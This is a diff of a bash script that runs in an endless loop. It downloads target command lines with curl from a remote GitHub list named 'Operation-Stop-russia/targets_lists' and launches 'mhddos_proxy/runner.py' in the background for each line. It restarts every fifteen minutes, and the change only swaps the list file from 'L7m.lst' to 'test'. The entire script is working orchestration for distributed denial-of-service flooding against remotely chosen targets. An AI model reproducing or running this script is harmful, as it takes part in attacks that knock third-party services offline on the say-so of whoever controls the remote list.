@@ -12,15 +12,15 @@ debug="debug"; debug="--$debug"
 while true
 do
    pkill -f runner.py 
-   list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]" | wc -l)
+   list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/test | cat | grep "^[^#]" | wc -l)
    while [[ $list_size = "0"  ]]
       do
             sleep 5
-            list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]" | wc -l)
+            list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/test | cat | grep "^[^#]" | wc -l)
       done
    for (( i=1; i<=list_size; i++ ))
       do
-            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]")")
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/test | cat | grep "^[^#]")")
             python3 ~/mhddos_proxy/runner.py $proxy $cmd_line $threads $rpc $debug&
       done
 sleep 15m
